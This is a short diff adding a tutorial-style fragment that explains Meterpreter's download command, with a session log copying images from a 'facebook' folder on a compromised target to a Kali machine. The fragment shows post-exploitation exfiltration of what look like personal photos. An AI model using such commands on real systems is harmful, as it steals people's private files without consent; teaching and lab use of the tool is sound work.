@@ -1,0 +1,7 @@
+The download command allows you to download a file from the remote target. The -r option allows you to do so recursively.
+
+meterpreter > download facebook
+
+[*] downloading: facebook/FB_IMG_1678193062006.jpg -> /home/kali/facebook/FB_IMG_1678193062006.jpg
+[*] Completed  : facebook/FB_IMG_1678193062006.jpg -> /home/kali/facebook/FB_IMG_1678193062006.jpg
+[*] downloading: facebook/FB_IMG_1690623506289.jpg -> /home/kali/facebook/FB_IMG_1690623506289.jpg
